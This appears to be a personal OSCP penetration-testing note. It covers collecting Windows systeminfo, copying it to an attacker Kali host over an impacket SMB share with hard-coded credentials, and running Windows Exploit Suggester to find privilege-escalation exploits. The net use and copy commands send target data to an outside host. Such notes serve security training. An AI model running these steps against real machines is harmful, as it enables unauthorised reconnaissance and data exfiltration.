Run collector on target machine
```
systeminfo > systeminfo.txt
```

Start SMB server on KALI
```
impacket-smbserver share $(pwd) -smb2support -username kali -password kali
```

Then on Windows:
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `net use \\\\${KaliIP}\\share /user:kali kali`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `copy systeminfo.txt \\\\${KaliIP}\\share\\`;

dv.paragraph("```bash\n" + command + "\n```");
```

Only exploits
```
wes systeminfo.txt --exploits-only
```

Search for Priv Esc
```
wes systeminfo.txt --exploits-only --impact "Elevation of Privilege"
```

Filter by severity:
```
wes systeminfo.txt --exploits-only --severity critical important
```

---

## Maintenance

Update definitions
```
wes -u
```

Chardet warning
```
pipx inject wes chardet
```